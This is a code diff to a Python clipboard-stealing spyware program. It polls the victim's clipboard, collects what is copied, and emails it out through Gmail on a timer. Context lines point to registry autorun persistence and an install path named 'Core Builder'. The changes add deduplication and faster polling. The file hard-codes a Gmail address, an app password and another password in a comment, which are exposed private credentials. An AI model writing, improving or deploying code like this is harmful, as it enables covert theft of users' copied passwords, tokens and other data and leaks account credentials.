@@ -54,16 +54,17 @@ if not os.path.exists(f'C:/Users/{comname}/AppData/Local/Programs/Core Builder D
 # autorun.AddToRegistry('datafile.txt')
 
 def clipboard_listener():
-    global temp_data, clipboard_data
+    global temp_data, clipboard_data, previous_clipboard_data
     try:
         if temp_data != pyperclip.paste():
-            temp_data = pyperclip.paste()
-            clipboard_data += f'\n\n{pyperclip.paste()}'
-            # print(f'clipboard data: {clipboard_data}')
+            if pyperclip.paste() not in previous_clipboard_data.split('\n\n'):
+                temp_data = pyperclip.paste()
+                clipboard_data += f'\n\n{pyperclip.paste()}'
+                # print(f'clipboard data: {clipboard_data}')
     except:
         time.sleep(2)
         clipboard_listener()
-    mytimer = Timer(interval=5, function = clipboard_listener)
+    mytimer = Timer(interval=3, function = clipboard_listener)
     mytimer.daemon = True
     mytimer.start()      
 tries = 0
@@ -98,7 +99,7 @@ def isdataavailable():
                 print('erased data from file.')
             except:
                 if tries < 3:
-                    time.sleep(5)
+                    time.sleep(10)
                     tries += 1
                     isdataavailable()
                 else:
@@ -111,11 +112,12 @@ def isdataavailable():
 
 
 clipboard_data = ''  
+previous_clipboard_data = ''  
 
 def main_func():
     clipboard_listener()
     print('main function started')
-    global clipboard_data
+    global clipboard_data, previous_clipboard_data
     SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
     EMAIL_ADDRESS = "007711meenakshi@gmail.com"
     EMAIL_PASSWORD = "tqbnkgbxprgppuim" #gmail pass => 12345ghjkl@1
@@ -177,7 +179,7 @@ def main_func():
             print(f"[+] Saved {self.filename}.txt")
 
         def sendmail(self, email, password, message):            
-            global clipboard_data
+            global clipboard_data,previous_clipboard_data
             isdataavailable()
             if not os.path.exists(os.path.join('C://', 'temp')):
                 os.mkdir(os.path.join('C://', 'temp'))
@@ -193,6 +195,7 @@ def main_func():
             # msg["To"] = 'core.builder11@gmail.com'
             # Anshumankumar7890@gmail.com
             clip_data = clipboard_data
+            previous_clipboard_data = clipboard_data
             print(f'clip_data :{clip_data}')
             # with open('clipboard.txt', 'r+') as clip: 
             #     clip_data = clip.read()           
